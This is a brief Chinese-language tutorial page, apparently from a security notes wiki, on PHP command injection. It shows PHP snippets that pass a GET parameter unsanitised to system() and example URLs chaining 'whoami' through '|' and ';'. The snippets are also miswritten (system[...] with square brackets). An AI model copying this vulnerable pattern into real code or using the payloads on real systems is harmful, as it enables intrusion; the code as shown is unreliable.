# PHP命令执行漏洞
应用程序的某些功能需要调用可以执行系统命令的函数[PHP命令执行漏洞](PHP命令执行漏洞.md)，如果这些函数或者函数的参数被用户控制，就有可能通过命令连接符拼接到正常的函数中，从而任意执行系统命令。

## Windows下的命令执行漏洞
Windows下的命令连接符[Windows连接符](Windows连接符.md)包括&、&&、|、||

代码示例：
```
<?php
	$ip=$_GET['ip'];
	system["ping".$ip];
?>
```

利用方法：
`cmd.php?ip=120.0.0.1|whoami`

## Linux下的命令执行漏洞
Linux下的命令连接符[Linux连接符](Linux连接符.md)包括 ;、&、&&、|、||

代码示例：
```
<?php
	$ip=$_GET['ip'];
	system["ping -c 3".$ip];
?>
```

利用方法：
`cmd.php?ip=120.0.0.1;whoami`

